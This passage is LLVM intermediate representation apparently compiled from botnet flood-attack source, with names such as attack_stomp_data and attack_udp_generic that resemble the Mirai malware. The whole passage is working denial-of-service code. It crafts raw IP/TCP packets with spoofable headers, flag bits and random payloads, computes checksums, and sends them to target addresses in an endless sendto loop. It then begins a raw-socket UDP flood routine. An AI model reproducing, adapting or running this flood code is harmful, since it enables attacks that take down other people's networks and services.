  %310 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %311 = bitcast %struct.iphdr* %310 to i8*
  %312 = load i8, i8* %311, align 4
  %313 = and i8 %312, -16
  %314 = or i8 %313, 5
  store i8 %314, i8* %311, align 4
  %315 = load i8, i8* %13, align 1
  %316 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 1
  store i8 %315, i8* %317, align 1
  %318 = load i32, i32* %24, align 4
  %319 = sext i32 %318 to i64
  %320 = add i64 40, %319
  %321 = trunc i64 %320 to i16
  %322 = call zeroext i16 @htons(i16 zeroext %321) #7
  %323 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 2
  store i16 %322, i16* %324, align 2
  %325 = load i16, i16* %14, align 2
  %326 = call zeroext i16 @htons(i16 zeroext %325) #7
  %327 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 3
  store i16 %326, i16* %328, align 4
  %329 = load i8, i8* %15, align 1
  %330 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 5
  store i8 %329, i8* %331, align 4
  %332 = load i8, i8* %16, align 1
  %333 = icmp ne i8 %332, 0
  br i1 %333, label %334, label %338

; <label>:334:                                    ; preds = %243
  %335 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %336 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 4
  store i16 %335, i16* %337, align 2
  br label %338

; <label>:338:                                    ; preds = %334, %243
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 6
  store i8 6, i8* %340, align 1
  %341 = load i32, i32* @LOCAL_ADDR, align 4
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 8
  store i32 %341, i32* %343, align 4
  %344 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %345 = load i32, i32* %9, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %344, i64 %346
  %348 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %347, i32 0, i32 0
  %349 = load i32, i32* %348, align 4
  %350 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 9
  store i32 %349, i32* %351, align 4
  %352 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %353 = load i32, i32* %9, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %355, i32 0, i32 3
  %357 = load i16, i16* %356, align 4
  %358 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %359 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %358, i32 0, i32 0
  store i16 %357, i16* %359, align 4
  %360 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %363, i32 0, i32 4
  %365 = load i16, i16* %364, align 2
  %366 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 1
  store i16 %365, i16* %367, align 2
  %368 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %371, i32 0, i32 2
  %373 = load i32, i32* %372, align 4
  %374 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %375 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %374, i32 0, i32 2
  store i32 %373, i32* %375, align 4
  %376 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %379, i32 0, i32 1
  %381 = load i32, i32* %380, align 4
  %382 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 3
  store i32 %381, i32* %383, align 4
  %384 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 4
  %386 = load i16, i16* %385, align 4
  %387 = and i16 %386, -241
  %388 = or i16 %387, 128
  store i16 %388, i16* %385, align 4
  %389 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %390 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %389, i32 0, i32 4
  %391 = load i16, i16* %390, align 4
  %392 = and i16 %391, -257
  %393 = or i16 %392, 256
  store i16 %393, i16* %390, align 4
  %394 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 4
  %396 = load i16, i16* %395, align 4
  %397 = and i16 %396, -4097
  %398 = or i16 %397, 4096
  store i16 %398, i16* %395, align 4
  %399 = call i32 @rand_next()
  %400 = and i32 %399, 65535
  %401 = trunc i32 %400 to i16
  %402 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 5
  store i16 %401, i16* %403, align 2
  %404 = load i8, i8* %18, align 1
  %405 = sext i8 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 4
  %408 = load i16, i16* %407, align 4
  %409 = and i16 %405, 1
  %410 = shl i16 %409, 13
  %411 = and i16 %408, -8193
  %412 = or i16 %411, %410
  store i16 %412, i16* %407, align 4
  %413 = load i8, i8* %19, align 1
  %414 = sext i8 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 4
  %417 = load i16, i16* %416, align 4
  %418 = and i16 %414, 1
  %419 = shl i16 %418, 12
  %420 = and i16 %417, -4097
  %421 = or i16 %420, %419
  store i16 %421, i16* %416, align 4
  %422 = load i8, i8* %20, align 1
  %423 = sext i8 %422 to i16
  %424 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 4
  %426 = load i16, i16* %425, align 4
  %427 = and i16 %423, 1
  %428 = shl i16 %427, 11
  %429 = and i16 %426, -2049
  %430 = or i16 %429, %428
  store i16 %430, i16* %425, align 4
  %431 = load i8, i8* %21, align 1
  %432 = sext i8 %431 to i16
  %433 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %434 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %433, i32 0, i32 4
  %435 = load i16, i16* %434, align 4
  %436 = and i16 %432, 1
  %437 = shl i16 %436, 10
  %438 = and i16 %435, -1025
  %439 = or i16 %438, %437
  store i16 %439, i16* %434, align 4
  %440 = load i8, i8* %22, align 1
  %441 = sext i8 %440 to i16
  %442 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 4
  %444 = load i16, i16* %443, align 4
  %445 = and i16 %441, 1
  %446 = shl i16 %445, 9
  %447 = and i16 %444, -513
  %448 = or i16 %447, %446
  store i16 %448, i16* %443, align 4
  %449 = load i8, i8* %23, align 1
  %450 = sext i8 %449 to i16
  %451 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 4
  %453 = load i16, i16* %452, align 4
  %454 = and i16 %450, 1
  %455 = shl i16 %454, 8
  %456 = and i16 %453, -257
  %457 = or i16 %456, %455
  store i16 %457, i16* %452, align 4
  %458 = load i8*, i8** %38, align 8
  %459 = load i32, i32* %24, align 4
  call void @rand_str(i8* %458, i32 %459)
  br label %491

; <label>:460:                                    ; preds = %235, %227
  %461 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %462 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %461, i32 0, i32 4
  %463 = load i16, i16* %462, align 4
  %464 = lshr i16 %463, 8
  %465 = and i16 %464, 1
  %466 = zext i16 %465 to i32
  %467 = icmp ne i32 %466, 0
  br i1 %467, label %476, label %468

; <label>:468:                                    ; preds = %460
  %469 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %470 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %469, i32 0, i32 4
  %471 = load i16, i16* %470, align 4
  %472 = lshr i16 %471, 10
  %473 = and i16 %472, 1
  %474 = zext i16 %473 to i32
  %475 = icmp ne i32 %474, 0
  br i1 %475, label %476, label %479

; <label>:476:                                    ; preds = %468, %460
  %477 = load i32, i32* %26, align 4
  %478 = call i32 @close(i32 %477)
  br label %121

; <label>:479:                                    ; preds = %468
  br label %480

; <label>:480:                                    ; preds = %479
  br label %481

; <label>:481:                                    ; preds = %480, %215
  br label %482

; <label>:482:                                    ; preds = %481, %211, %203
  %483 = call i64 @time(i64* null) #6
  %484 = load i64, i64* %31, align 8
  %485 = sub nsw i64 %483, %484
  %486 = icmp sgt i64 %485, 10
  br i1 %486, label %487, label %490

; <label>:487:                                    ; preds = %482
  %488 = load i32, i32* %26, align 4
  %489 = call i32 @close(i32 %488)
  br label %121

; <label>:490:                                    ; preds = %482
  br label %191

; <label>:491:                                    ; preds = %338
  br label %492

; <label>:492:                                    ; preds = %491, %124
  %493 = load i32, i32* %9, align 4
  %494 = add nsw i32 %493, 1
  store i32 %494, i32* %9, align 4
  br label %115

; <label>:495:                                    ; preds = %115
  br label %496

; <label>:496:                                    ; preds = %606, %495
  store i32 0, i32* %9, align 4
  br label %497

; <label>:497:                                    ; preds = %603, %496
  %498 = load i32, i32* %9, align 4
  %499 = load i8, i8* %5, align 1
  %500 = zext i8 %499 to i32
  %501 = icmp slt i32 %498, %500
  br i1 %501, label %502, label %606

; <label>:502:                                    ; preds = %497
  %503 = load i8**, i8*** %12, align 8
  %504 = load i32, i32* %9, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds i8*, i8** %503, i64 %505
  %507 = load i8*, i8** %506, align 8
  store i8* %507, i8** %39, align 8
  %508 = load i8*, i8** %39, align 8
  %509 = bitcast i8* %508 to %struct.iphdr*
  store %struct.iphdr* %509, %struct.iphdr** %40, align 8
  %510 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %511 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %510, i64 1
  %512 = bitcast %struct.iphdr* %511 to %struct.tcphdr*
  store %struct.tcphdr* %512, %struct.tcphdr** %41, align 8
  %513 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i64 1
  %515 = bitcast %struct.tcphdr* %514 to i8*
  store i8* %515, i8** %42, align 8
  %516 = load i16, i16* %14, align 2
  %517 = zext i16 %516 to i32
  %518 = icmp eq i32 %517, 65535
  br i1 %518, label %519, label %525

; <label>:519:                                    ; preds = %502
  %520 = call i32 @rand_next()
  %521 = and i32 %520, 65535
  %522 = trunc i32 %521 to i16
  %523 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %524 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %523, i32 0, i32 3
  store i16 %522, i16* %524, align 4
  br label %525

; <label>:525:                                    ; preds = %519, %502
  %526 = load i8, i8* %25, align 1
  %527 = icmp ne i8 %526, 0
  br i1 %527, label %528, label %531

; <label>:528:                                    ; preds = %525
  %529 = load i8*, i8** %42, align 8
  %530 = load i32, i32* %24, align 4
  call void @rand_str(i8* %529, i32 %530)
  br label %531

; <label>:531:                                    ; preds = %528, %525
  %532 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 7
  store i16 0, i16* %533, align 2
  %534 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %535 = bitcast %struct.iphdr* %534 to i16*
  %536 = call zeroext i16 @checksum_generic(i16* %535, i32 20)
  %537 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 7
  store i16 %536, i16* %538, align 2
  %539 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %540 = load i32, i32* %9, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %539, i64 %541
  %543 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %542, i32 0, i32 1
  %544 = load i32, i32* %543, align 4
  %545 = add i32 %544, 1
  store i32 %545, i32* %543, align 4
  %546 = trunc i32 %544 to i16
  %547 = call zeroext i16 @htons(i16 zeroext %546) #7
  %548 = zext i16 %547 to i32
  %549 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %550 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %549, i32 0, i32 2
  store i32 %548, i32* %550, align 4
  %551 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %552 = load i32, i32* %9, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %551, i64 %553
  %555 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %554, i32 0, i32 2
  %556 = load i32, i32* %555, align 4
  %557 = trunc i32 %556 to i16
  %558 = call zeroext i16 @htons(i16 zeroext %557) #7
  %559 = zext i16 %558 to i32
  %560 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %561 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %560, i32 0, i32 3
  store i32 %559, i32* %561, align 4
  %562 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 6
  store i16 0, i16* %563, align 4
  %564 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %565 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %566 = bitcast %struct.tcphdr* %565 to i8*
  %567 = load i32, i32* %24, align 4
  %568 = sext i32 %567 to i64
  %569 = add i64 20, %568
  %570 = trunc i64 %569 to i16
  %571 = call zeroext i16 @htons(i16 zeroext %570) #7
  %572 = load i32, i32* %24, align 4
  %573 = sext i32 %572 to i64
  %574 = add i64 20, %573
  %575 = trunc i64 %574 to i32
  %576 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %564, i8* %566, i16 zeroext %571, i32 %575)
  %577 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 6
  store i16 %576, i16* %578, align 4
  %579 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 1
  %581 = load i16, i16* %580, align 2
  %582 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %583 = load i32, i32* %9, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %582, i64 %584
  %586 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %585, i32 0, i32 0
  %587 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %586, i32 0, i32 1
  store i16 %581, i16* %587, align 2
  %588 = load i32, i32* %10, align 4
  %589 = load i8*, i8** %39, align 8
  %590 = load i32, i32* %24, align 4
  %591 = sext i32 %590 to i64
  %592 = add i64 40, %591
  %593 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %594 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %595 = load i32, i32* %9, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %594, i64 %596
  %598 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %597, i32 0, i32 0
  %599 = bitcast %struct.sockaddr_in* %598 to %struct.sockaddr*
  store %struct.sockaddr* %599, %struct.sockaddr** %593, align 8
  %600 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %601 = load %struct.sockaddr*, %struct.sockaddr** %600, align 8
  %602 = call i64 @sendto(i32 %588, i8* %589, i64 %592, i32 16384, %struct.sockaddr* %601, i32 16)
  br label %603

; <label>:603:                                    ; preds = %531
  %604 = load i32, i32* %9, align 4
  %605 = add nsw i32 %604, 1
  store i32 %605, i32* %9, align 4
  br label %497

; <label>:606:                                    ; preds = %497
  br label %496

; <label>:607:                                    ; preds = %202, %111, %105
  ret void
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %312

; <label>:76:                                     ; preds = %72
  store i32 1, i32* %9, align 4
  %77 = load i32, i32* %10, align 4
  %78 = bitcast i32* %9 to i8*
  %79 = call i32 @setsockopt(i32 %77, i32 0, i32 3, i8* %78, i32 4) #6
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %76
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 %82)
  br label %312

; <label>:84:                                     ; preds = %76
  store i32 0, i32* %9, align 4
  br label %85

; <label>:85:                                     ; preds = %167, %84
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %5, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %170

; <label>:90:                                     ; preds = %85
  %91 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %92 = load i8**, i8*** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8*, i8** %92, i64 %94
  store i8* %91, i8** %95, align 8
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  %100 = load i8*, i8** %99, align 8
  %101 = bitcast i8* %100 to %struct.iphdr*
  store %struct.iphdr* %101, %struct.iphdr** %21, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i64 1
  %104 = bitcast %struct.iphdr* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %106 = bitcast %struct.iphdr* %105 to i8*
  %107 = load i8, i8* %106, align 4
  %108 = and i8 %107, 15
  %109 = or i8 %108, 64
  store i8 %109, i8* %106, align 4
  %110 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %111 = bitcast %struct.iphdr* %110 to i8*
  %112 = load i8, i8* %111, align 4
  %113 = and i8 %112, -16
  %114 = or i8 %113, 5
  store i8 %114, i8* %111, align 4
  %115 = load i8, i8* %12, align 1
  %116 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 1
  store i8 %115, i8* %117, align 1
  %118 = load i16, i16* %18, align 2
  %119 = zext i16 %118 to i64
  %120 = add i64 28, %119
  %121 = trunc i64 %120 to i16
  %122 = call zeroext i16 @htons(i16 zeroext %121) #7
  %123 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %124 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %123, i32 0, i32 2
  store i16 %122, i16* %124, align 2
  %125 = load i16, i16* %13, align 2
  %126 = call zeroext i16 @htons(i16 zeroext %125) #7
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 3
  store i16 %126, i16* %128, align 4
  %129 = load i8, i8* %14, align 1
  %130 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i32 0, i32 5
  store i8 %129, i8* %131, align 4
  %132 = load i8, i8* %15, align 1
  %133 = icmp ne i8 %132, 0
  br i1 %133, label %134, label %138

; <label>:134:                                    ; preds = %90
  %135 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %136 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 4
  store i16 %135, i16* %137, align 2
  br label %138

; <label>:138:                                    ; preds = %134, %90
  %139 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 6
  store i8 17, i8* %140, align 1
  %141 = load i32, i32* %20, align 4
  %142 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 8
  store i32 %141, i32* %143, align 4
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 9
  store i32 %149, i32* %151, align 4
  %152 = load i16, i16* %16, align 2
  %153 = call zeroext i16 @htons(i16 zeroext %152) #7
  %154 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %155 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %154, i32 0, i32 0
  store i16 %153, i16* %155, align 2
  %156 = load i16, i16* %17, align 2
  %157 = call zeroext i16 @htons(i16 zeroext %156) #7
  %158 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %159 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %158, i32 0, i32 1
  store i16 %157, i16* %159, align 2
  %160 = load i16, i16* %18, align 2
  %161 = zext i16 %160 to i64
  %162 = add i64 8, %161
  %163 = trunc i64 %162 to i16
  %164 = call zeroext i16 @htons(i16 zeroext %163) #7
  %165 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %166 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %165, i32 0, i32 2
  store i16 %164, i16* %166, align 2
  br label %167

; <label>:167:                                    ; preds = %138
  %168 = load i32, i32* %9, align 4
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %9, align 4
  br label %85

; <label>:170:                                    ; preds = %85
  br label %171

; <label>:171:                                    ; preds = %311, %170
  store i32 0, i32* %9, align 4
  br label %172

; <label>:172:                                    ; preds = %308, %171
  %173 = load i32, i32* %9, align 4
  %174 = load i8, i8* %5, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  br i1 %176, label %177, label %311

; <label>:177:                                    ; preds = %172
  %178 = load i8**, i8*** %11, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds i8*, i8** %178, i64 %180
  %182 = load i8*, i8** %181, align 8
  store i8* %182, i8** %23, align 8
  %183 = load i8*, i8** %23, align 8
  %184 = bitcast i8* %183 to %struct.iphdr*
  store %struct.iphdr* %184, %struct.iphdr** %24, align 8
  %185 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i64 1
  %187 = bitcast %struct.iphdr* %186 to %struct.udphdr*
  store %struct.udphdr* %187, %struct.udphdr** %25, align 8
  %188 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i64 1
  %190 = bitcast %struct.udphdr* %189 to i8*
  store i8* %190, i8** %26, align 8
  %191 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %192 = load i32, i32* %9, align 4
  %193 = sext i32 %192 to i64
